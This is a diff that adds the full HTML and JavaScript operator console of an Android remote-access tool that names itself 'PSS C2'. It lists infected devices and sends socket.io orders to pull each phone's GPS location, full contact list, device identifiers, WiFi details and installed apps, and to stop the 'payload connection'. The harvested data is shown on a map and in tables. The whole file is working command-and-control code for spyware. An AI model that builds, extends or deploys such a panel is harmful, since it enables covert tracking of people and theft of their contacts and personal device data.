@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PSS — Clients</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --g1:#00ff88;--g2:#00dd77;--g3:#00bb66;--g4:#009955;--g5:#006633;
+  --bg:#050608;--bg2:#0a0c10;--bg3:#0e1116;--card:#0d1117;--card2:#131920;
+  --border:rgba(0,255,136,.08);--border-h:rgba(0,255,136,.18);
+  --t1:#e8ede9;--t2:#8b9b8e;--t3:#4a5a4e;
+  --danger:#ff3b4f;--warn:#ffb020;
+  --radius:12px;--radius-sm:8px;
+  --mono:'JetBrains Mono',monospace;--sans:'Inter',system-ui,sans-serif;--display:'Orbitron',sans-serif;
+  --shadow:0 8px 32px rgba(0,0,0,.6);
+  --glow:0 0 40px rgba(0,255,136,.06);
+}
+html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--sans);overflow:hidden;-webkit-font-smoothing:antialiased}
+::selection{background:rgba(0,255,136,.2);color:#fff}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(0,255,136,.15);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:rgba(0,255,136,.25)}
+
+.layout{display:grid;grid-template-columns:260px 1fr;height:100vh}
+
+/* ═══ SIDEBAR ═══ */
+.sidebar{
+  background:var(--bg2);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;overflow:hidden;
+}
+.sidebar-head{
+  padding:16px 18px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+  background:rgba(0,255,136,.01);
+}
+.sidebar-head h2{font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--g1)}
+.sidebar-count{
+  font-family:var(--mono);font-size:10px;
+  padding:3px 10px;border-radius:12px;
+  background:rgba(0,255,136,.06);color:var(--g1);
+  border:1px solid rgba(0,255,136,.12);font-weight:600;
+}
+.device-list{flex:1;overflow-y:auto;padding:6px}
+
+.device-card{
+  padding:12px 14px;border-radius:var(--radius-sm);
+  margin-bottom:3px;cursor:pointer;
+  border:1px solid transparent;
+  transition:all .2s ease;
+  display:flex;align-items:center;gap:12px;
+}
+.device-card:hover{background:rgba(0,255,136,.02);border-color:var(--border)}
+.device-card.active{background:rgba(0,255,136,.04);border-color:rgba(0,255,136,.18)}
+.device-card.active::before{
+  content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);
+  width:3px;height:60%;border-radius:0 2px 2px 0;background:var(--g1);
+  box-shadow:0 0 10px var(--g1);
+}
+.device-card{position:relative}
+.device-dot{width:7px;height:7px;border-radius:50%;background:var(--g1);box-shadow:0 0 10px rgba(0,255,136,.6);flex-shrink:0}
+.device-info{flex:1;min-width:0}
+.device-model{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.device-meta{font-family:var(--mono);font-size:9px;color:var(--t3);margin-top:2px}
+.device-empty{text-align:center;padding:60px 20px}
+.device-empty-icon{
+  width:48px;height:48px;margin:0 auto 14px;border-radius:12px;
+  background:rgba(0,255,136,.03);border:1px solid var(--border);
+  display:flex;align-items:center;justify-content:center;
+}
+.device-empty-icon svg{width:22px;height:22px;fill:var(--t3);opacity:.4}
+.device-empty p{color:var(--t3);font-size:12px;font-weight:500}
+.device-empty small{color:var(--t3);font-size:10px;opacity:.5;display:block;margin-top:4px}
+
+/* ═══ MAIN ═══ */
+.main{display:flex;flex-direction:column;overflow:hidden}
+.main-head{
+  padding:14px 24px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:16px;
+  background:rgba(0,255,136,.01);flex-shrink:0;
+}
+.main-title{font-family:var(--display);font-size:13px;font-weight:700;letter-spacing:1px;color:var(--t1)}
+.main-subtitle{font-family:var(--mono);font-size:10px;color:var(--t3);margin-top:2px}
+
+/* Command buttons */
+.cmd-bar{
+  padding:10px 24px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:6px;flex-shrink:0;
+  background:var(--bg2);flex-wrap:wrap;
+}
+.cmd-btn{
+  display:inline-flex;align-items:center;gap:7px;
+  padding:7px 14px;border-radius:6px;
+  background:var(--bg3);border:1px solid var(--border);
+  color:var(--t3);font-size:11px;font-weight:600;
+  cursor:pointer;transition:all .2s;font-family:var(--sans);
+  letter-spacing:.3px;
+}
+.cmd-btn svg{width:13px;height:13px;fill:currentColor}
+.cmd-btn:hover{border-color:rgba(0,255,136,.2);color:var(--g2);background:rgba(0,255,136,.03)}
+.cmd-btn.active{border-color:rgba(0,255,136,.25);color:var(--g1);background:rgba(0,255,136,.05)}
+.cmd-btn:disabled,.cmd-btn.disabled{opacity:.25;pointer-events:none}
+.cmd-sep{width:1px;height:22px;background:var(--border);margin:0 4px}
+
+/* Output */
+.output{flex:1;overflow-y:auto;padding:20px 24px}
+
+/* Welcome */
+.welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center}
+.welcome-icon{
+  width:56px;height:56px;border-radius:14px;
+  background:rgba(0,255,136,.03);border:1px solid var(--border);
+  display:flex;align-items:center;justify-content:center;margin-bottom:16px;
+}
+.welcome-icon svg{width:24px;height:24px;fill:var(--g3);opacity:.5}
+.welcome h2{font-family:var(--display);font-size:14px;font-weight:700;letter-spacing:2px;color:var(--g1);margin-bottom:8px}
+.welcome p{font-size:12px;color:var(--t3);max-width:280px;line-height:1.5}
+
+/* ═══ DATA COMPONENTS ═══ */
+
+.err-banner{
+  display:flex;align-items:flex-start;gap:12px;
+  padding:12px 16px;border-radius:var(--radius-sm);
+  background:rgba(255,59,79,.04);border:1px solid rgba(255,59,79,.12);
+  margin-bottom:14px;animation:fadeIn .3s ease;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
+.err-banner svg{width:16px;height:16px;fill:var(--danger);flex-shrink:0;margin-top:1px}
+.err-banner-body{flex:1}
+.err-banner-title{font-size:11px;font-weight:700;color:var(--danger);margin-bottom:2px}
+.err-banner-msg{font-size:11px;color:#ff8888;line-height:1.4}
+.err-banner .dismiss{background:none;border:none;color:var(--danger);cursor:pointer;font-size:14px;opacity:.4;padding:0 4px}
+.err-banner .dismiss:hover{opacity:1}
+
+.result-card{
+  background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  overflow:hidden;margin-bottom:14px;animation:slideUp .35s ease;
+  position:relative;
+}
+.result-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(0,255,136,.2),transparent);
+}
+@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.result-head{
+  display:flex;align-items:center;gap:10px;
+  padding:12px 18px;border-bottom:1px solid var(--border);
+  background:rgba(0,255,136,.01);
+}
+.result-head svg{width:14px;height:14px;fill:var(--g2)}
+.result-head h4{font-size:12px;font-weight:700;flex:1;letter-spacing:.3px}
+.result-head time{font-family:var(--mono);font-size:9px;color:var(--t3)}
+.result-body{padding:16px 18px}
+
+/* Map */
+.map-wrap{width:100%;height:300px;border-radius:var(--radius-sm);overflow:hidden;border:1px solid var(--border);margin-bottom:12px}
+.coord-row{display:flex;gap:16px;flex-wrap:wrap;font-family:var(--mono);font-size:11px;color:var(--t3)}
+.coord-row strong{color:var(--g1)}
+
+/* Table */
+.data-table{width:100%;border-collapse:collapse}
+.data-table th{
+  text-align:left;padding:7px 12px;font-size:9px;font-weight:700;
+  text-transform:uppercase;letter-spacing:1.5px;color:var(--t3);
+  border-bottom:1px solid var(--border);
+}
+.data-table td{padding:8px 12px;font-size:11px;border-bottom:1px solid rgba(0,255,136,.03);color:var(--t2)}
+.data-table tr:hover td{background:rgba(0,255,136,.01)}
+.data-table .pkg{font-family:var(--mono);font-size:10px;color:var(--t3)}
+
+/* Info grid */
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.info-cell{
+  background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius-sm);
+  padding:10px 14px;transition:border-color .2s;
+}
+.info-cell:hover{border-color:var(--border-h)}
+.info-cell-label{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--t3);margin-bottom:4px}
+.info-cell-value{font-family:var(--mono);font-size:11px;color:var(--t1);word-break:break-all}
+
+/* Automation */
+.auto-panel{display:flex;flex-direction:column;gap:4px}
+.auto-row{
+  display:flex;align-items:center;gap:14px;
+  padding:10px 14px;border-radius:var(--radius-sm);
+  background:var(--bg3);border:1px solid var(--border);
+  transition:all .2s;cursor:pointer;
+}
+.auto-row:hover{border-color:rgba(0,255,136,.15);background:rgba(0,255,136,.02)}
+.auto-row.sent{border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.04)}
+.auto-name{font-family:var(--mono);font-size:12px;font-weight:600;color:var(--g1);min-width:130px}
+.auto-desc{font-size:11px;color:var(--t3);flex:1}
+.auto-send{
+  padding:4px 12px;border-radius:5px;
+  background:rgba(0,255,136,.05);border:1px solid rgba(0,255,136,.12);
+  color:var(--g1);font-size:10px;font-weight:700;letter-spacing:.5px;
+  cursor:pointer;transition:all .2s;font-family:var(--sans);
+}
+.auto-send:hover{background:rgba(0,255,136,.1);border-color:rgba(0,255,136,.25);box-shadow:0 0 10px rgba(0,255,136,.1)}
+.auto-log{
+  margin-top:10px;padding:8px 14px;border-radius:6px;
+  background:var(--bg);border-left:2px solid var(--border);
+  font-family:var(--mono);font-size:10px;color:var(--t3);
+}
+.auto-log.ok{border-left-color:var(--g1);color:var(--g2)}
+
+.loading{
+  display:flex;align-items:center;gap:8px;
+  font-family:var(--mono);font-size:10px;color:var(--t3);padding:8px 0;
+}
+.loading-dot{width:5px;height:5px;border-radius:50%;background:var(--g1);animation:blink 1.2s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+
+@media(max-width:768px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{max-height:180px;border-right:none;border-bottom:1px solid var(--border)}
+  .info-grid{grid-template-columns:1fr}
+  .cmd-bar{padding:8px 14px;gap:5px}
+  .cmd-btn{padding:5px 10px;font-size:10px}
+  .output{padding:14px}
+}
+</style>
+</head>
+<body>
+
+<div class="layout">
+  <div class="sidebar">
+    <div class="sidebar-head">
+      <h2>DEVICES</h2>
+      <span class="sidebar-count" id="dev-count">0</span>
+    </div>
+    <div class="device-list" id="device-list">
+      <div class="device-empty" id="device-empty">
+        <div class="device-empty-icon"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></div>
+        <p>Waiting for connections</p>
+        <small>Devices appear here automatically</small>
+      </div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="main-head">
+      <div>
+        <div class="main-title" id="main-title">COMMAND CENTER</div>
+        <div class="main-subtitle" id="main-sub">Select a device to begin</div>
+      </div>
+    </div>
+    <div class="cmd-bar">
+      <button class="cmd-btn disabled" id="btn-loc" onclick="sendCmd('location')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg>
+        Location
+      </button>
+      <button class="cmd-btn disabled" id="btn-contacts" onclick="sendCmd('contacts')">
+        <svg viewBox="0 0 24 24"><path d="M20 0H4v2h16V0zM4 24h16v-2H4v2zM20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 2.75c1.24 0 2.25 1.01 2.25 2.25s-1.01 2.25-2.25 2.25S9.75 10.24 9.75 9s1.01-2.25 2.25-2.25zM17 17H7v-1.5c0-1.67 3.33-2.5 5-2.5s5 .83 5 2.5V17z"/></svg>
+        Contacts
+      </button>
+      <button class="cmd-btn disabled" id="btn-info" onclick="sendCmd('device_info')">
+        <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+        Device Info
+      </button>
+      <div class="cmd-sep"></div>
+      <button class="cmd-btn disabled" id="btn-auto" onclick="sendCmd('automation')">
+        <svg viewBox="0 0 24 24"><path d="M13 2.05v3.03c3.39.49 6 3.39 6 6.92 0 .9-.18 1.75-.48 2.54l2.6 1.53c.56-1.24.88-2.62.88-4.07 0-5.18-3.95-9.45-9-9.95zM12 19c-3.87 0-7-3.13-7-7 0-3.53 2.61-6.43 6-6.92V2.05c-5.06.5-9 4.76-9 9.95 0 5.52 4.47 10 9.99 10 3.31 0 6.24-1.61 8.06-4.09l-2.6-1.53A6.95 6.95 0 0112 19z"/></svg>
+        Automation
+      </button>
+    </div>
+
+    <div class="output" id="output">
+      <div class="welcome" id="welcome">
+        <div class="welcome-icon"><svg viewBox="0 0 24 24"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg></div>
+        <h2>PSS C2</h2>
+        <p>Select a device from the sidebar, then use the command buttons to interact.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+var socket=io();var clients=[],selected=null;
+
+var AUTO_CMDS=[
+  {order:'get_location',desc:'Request current GPS/Network location coordinates'},
+  {order:'contacts',desc:'Sync all contacts — names and phone numbers'},
+  {order:'get_info',desc:'Full device dump — model, battery, WiFi, storage, IDs'},
+  {order:'apps_list',desc:'Enumerate all installed applications'},
+  {order:'stop',desc:'Terminate the payload connection on device'},
+];
+
+function esc(s){var e=document.createElement('span');e.textContent=s;return e.innerHTML}
+
+function showErr(title,msg){
+  var o=document.getElementById('output');
+  var el=document.createElement('div');el.className='err-banner';
+  el.innerHTML='<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><div class="err-banner-body"><div class="err-banner-title">'+esc(title)+'</div><div class="err-banner-msg">'+esc(msg)+'</div></div><button class="dismiss" onclick="this.closest(\'.err-banner\').remove()">&times;</button>';
+  o.insertBefore(el,o.firstChild);
+}
+
+function enableBtns(on){
+  ['btn-loc','btn-contacts','btn-info','btn-auto'].forEach(function(id){
+    var b=document.getElementById(id);if(on)b.classList.remove('disabled');else b.classList.add('disabled');
+  });
+}
+
+function selectDevice(id){
+  selected=id;
+  var c=clients.find(function(x){return x.id===id});if(!c)return;
+  document.querySelectorAll('.device-card').forEach(function(e){e.classList.remove('active')});
+  var el=document.querySelector('.device-card[data-id="'+id+'"]');if(el)el.classList.add('active');
+  enableBtns(true);
+  document.getElementById('main-title').textContent=c.details.model||'Unknown';
+  document.getElementById('main-sub').textContent=c.details.manufacturer+' · SDK '+(c.details.sdk||'?');
+  clearOutput();
+}
+
+function clearOutput(){document.getElementById('output').innerHTML=''}
+
+function sendCmd(type){
+  if(!selected){showErr('No Device','Select a device from the sidebar first.');return}
+  var c=clients.find(function(x){return x.id===selected});
+  if(!c){showErr('Device Offline','This device has disconnected.');enableBtns(false);return}
+  if(type==='location'){socket.emit('order',{id:selected,order:'get_location',params:{}});addLoading('Requesting location...')}
+  else if(type==='contacts'){socket.emit('order',{id:selected,order:'contacts',params:{}});addLoading('Syncing contacts...')}
+  else if(type==='device_info'){socket.emit('order',{id:selected,order:'get_info',params:{}});addLoading('Fetching device info...')}
+  else if(type==='automation'){showAutoPanel()}
+}
+
+function addLoading(msg){
+  var o=document.getElementById('output');
+  var el=document.createElement('div');el.className='loading';el.id='loading-ind';
+  el.innerHTML='<div class="loading-dot"></div>'+esc(msg);
+  o.insertBefore(el,o.firstChild);
+}
+function removeLoading(){var el=document.getElementById('loading-ind');if(el)el.remove()}
+
+function showAutoPanel(){
+  clearOutput();var o=document.getElementById('output');
+  var card=document.createElement('div');card.className='result-card';
+  var rows=AUTO_CMDS.map(function(cmd){
+    return '<div class="auto-row" data-order="'+cmd.order+'" onclick="fireAuto(\''+cmd.order+'\')"><div class="auto-name">'+cmd.order+'</div><div class="auto-desc">'+cmd.desc+'</div><button class="auto-send" onclick="event.stopPropagation();fireAuto(\''+cmd.order+'\')">SEND</button></div>';
+  }).join('');
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M13 2.05v3.03c3.39.49 6 3.39 6 6.92 0 .9-.18 1.75-.48 2.54l2.6 1.53c.56-1.24.88-2.62.88-4.07 0-5.18-3.95-9.45-9-9.95zM12 19c-3.87 0-7-3.13-7-7 0-3.53 2.61-6.43 6-6.92V2.05c-5.06.5-9 4.76-9 9.95 0 5.52 4.47 10 9.99 10 3.31 0 6.24-1.61 8.06-4.09l-2.6-1.53A6.95 6.95 0 0112 19z"/></svg><h4>Automation Commands</h4><time>Click to execute</time></div><div class="result-body"><div class="auto-panel">'+rows+'</div><div class="auto-log" id="auto-log">Ready — select a command to send</div></div>';
+  o.appendChild(card);
+}
+
+function fireAuto(order){
+  if(!selected)return;
+  socket.emit('order',{id:selected,order:order,params:{}});
+  var log=document.getElementById('auto-log');
+  if(log){log.className='auto-log ok';log.textContent='> Sent "'+order+'" at '+new Date().toLocaleTimeString()}
+  var row=document.querySelector('.auto-row[data-order="'+order+'"]');
+  if(row){row.classList.add('sent');setTimeout(function(){row.classList.remove('sent')},1500)}
+}
+
+function renderLocation(data){
+  if(data.id!==selected)return;removeLoading();
+  var lat=data.data.lat||0,lon=data.data.lon||0,acc=data.data.accuracy||'?',prov=data.data.provider||'unknown';
+  var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
+  var mid='map-'+Date.now();
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg><h4>Location</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><div class="map-wrap" id="'+mid+'"></div><div class="coord-row">Lat: <strong>'+lat.toFixed(6)+'</strong> &nbsp; Lon: <strong>'+lon.toFixed(6)+'</strong> &nbsp; Accuracy: <strong>'+acc+'m</strong> &nbsp; Provider: <strong>'+prov.toUpperCase()+'</strong></div></div>';
+  o.insertBefore(card,o.firstChild);
+  setTimeout(function(){
+    var el=document.getElementById(mid);if(!el)return;
+    try{
+      var map=L.map(el,{zoomControl:true,attributionControl:false}).setView([lat,lon],15);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(map);
+      L.marker([lat,lon]).addTo(map).bindPopup('<b>'+lat.toFixed(6)+', '+lon.toFixed(6)+'</b>').openPopup();
+      L.circle([lat,lon],{radius:acc||50,color:'#00ff88',fillColor:'rgba(0,255,136,.12)',fillOpacity:.4}).addTo(map);
+    }catch(e){el.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--danger);font-size:11px">Map error: '+e.message+'</div>'}
+  },100);
+}
+
+function renderContacts(data){
+  if(data.id!==selected)return;removeLoading();
+  var list=data.data.data||[];
+  if(!list.length){showErr('No Contacts','Device returned an empty contact list.');return}
+  var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
+  var rows=list.map(function(c){return '<tr><td>'+esc(c.name||'—')+'</td><td>'+esc(c.number||c.phone||'—')+'</td></tr>'}).join('');
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M20 0H4v2h16V0zM4 24h16v-2H4v2zM20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 2.75c1.24 0 2.25 1.01 2.25 2.25s-1.01 2.25-2.25 2.25S9.75 10.24 9.75 9s1.01-2.25 2.25-2.25zM17 17H7v-1.5c0-1.67 3.33-2.5 5-2.5s5 .83 5 2.5V17z"/></svg><h4>Contacts ('+list.length+')</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><table class="data-table"><thead><tr><th>Name</th><th>Number</th></tr></thead><tbody>'+rows+'</tbody></table></div>';
+  o.insertBefore(card,o.firstChild);
+}
+
+function renderDeviceInfo(data){
+  if(data.id!==selected)return;removeLoading();
+  var d=data.data;
+  var fields=[['Model',d.model],['Manufacturer',d.manufacturer],['Android',d.version],['SDK',d.sdk],['Fingerprint',d.fingerprint],['Android ID',d.android_id],['Battery',d.battery],['Network',d.network_type],['WiFi SSID',d.wifi_ssid],['WiFi IP',d.wifi_ip],['Operator',d.operator],['Timezone',d.timezone],['Internal Storage',d.internal_storage],['External Storage',d.external_storage]];
+  var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
+  var cells=fields.map(function(f){return '<div class="info-cell"><div class="info-cell-label">'+f[0]+'</div><div class="info-cell-value">'+esc(String(f[1]||'—'))+'</div></div>'}).join('');
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg><h4>Device Information</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><div class="info-grid">'+cells+'</div></div>';
+  o.insertBefore(card,o.firstChild);
+}
+
+function renderApps(data){
+  if(data.id!==selected)return;removeLoading();
+  var apps=data.data.data||[];
+  if(!apps.length){showErr('No Apps','Device returned an empty application list.');return}
+  var o=document.getElementById('output');var card=document.createElement('div');card.className='result-card';
+  var rows=apps.map(function(a){return '<tr><td>'+esc(a.label||a.name||'—')+'</td><td class="pkg">'+esc(a.package||'—')+'</td></tr>'}).join('');
+  card.innerHTML='<div class="result-head"><svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg><h4>Installed Apps ('+apps.length+')</h4><time>'+new Date().toLocaleTimeString()+'</time></div><div class="result-body"><table class="data-table"><thead><tr><th>Application</th><th>Package</th></tr></thead><tbody>'+rows+'</tbody></table></div>';
+  o.insertBefore(card,o.firstChild);
+}
+
+function renderDeviceList(){
+  var list=document.getElementById('device-list');
+  document.getElementById('dev-count').textContent=clients.length;
+  if(!clients.length){
+    list.innerHTML='<div class="device-empty" id="device-empty"><div class="device-empty-icon"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></div><p>Waiting for connections</p><small>Devices appear here automatically</small></div>';
+    return;
+  }
+  var existIds=[];list.querySelectorAll('.device-card').forEach(function(e){existIds.push(e.dataset.id)});
+  var curIds=clients.map(function(c){return c.id});
+  existIds.forEach(function(id){if(curIds.indexOf(id)===-1){var e=list.querySelector('[data-id="'+id+'"]');if(e)e.remove()}});
+  var empty=document.getElementById('device-empty');if(empty)empty.remove();
+  clients.forEach(function(c){
+    if(existIds.indexOf(c.id)===-1){
+      var el=document.createElement('div');el.className='device-card'+(c.id===selected?' active':'');el.dataset.id=c.id;
+      el.onclick=function(){selectDevice(c.id)};
+      el.innerHTML='<div class="device-dot"></div><div class="device-info"><div class="device-model">'+esc(c.details.model||'Unknown')+'</div><div class="device-meta">'+esc(c.details.manufacturer||'')+' · SDK '+(c.details.sdk||'?')+'</div></div>';
+      list.appendChild(el);
+    }
+  });
+}
+
+socket.on('initial_clients',function(list){clients=list;renderDeviceList()});
+socket.on('client_connected',function(c){if(!clients.find(function(x){return x.id===c.id}))clients.push(c);renderDeviceList()});
+socket.on('client_disconnected',function(id){
+  clients=clients.filter(function(c){return c.id!==id});renderDeviceList();
+  if(selected===id){selected=null;enableBtns(false);document.getElementById('main-title').textContent='COMMAND CENTER';document.getElementById('main-sub').textContent='Device disconnected';showErr('Device Lost','The selected device has disconnected.')}
+});
+socket.on('client_data',function(p){
+  if(!p||!p.data)return;var t=p.data.type;
+  if(t==='location')renderLocation(p);
+  else if(t==='contacts_sync'||t==='addr_sync')renderContacts(p);
+  else if(t==='device_info')renderDeviceInfo(p);
+  else if(t==='apps_list')renderApps(p);
+});
+socket.on('connect_error',function(){showErr('Connection Error','Cannot reach C2 server.')});
+socket.on('disconnect',function(){showErr('Disconnected','WebSocket lost. Reconnecting...')});
+
+renderDeviceList();
+</script>
+</body>
+</html>
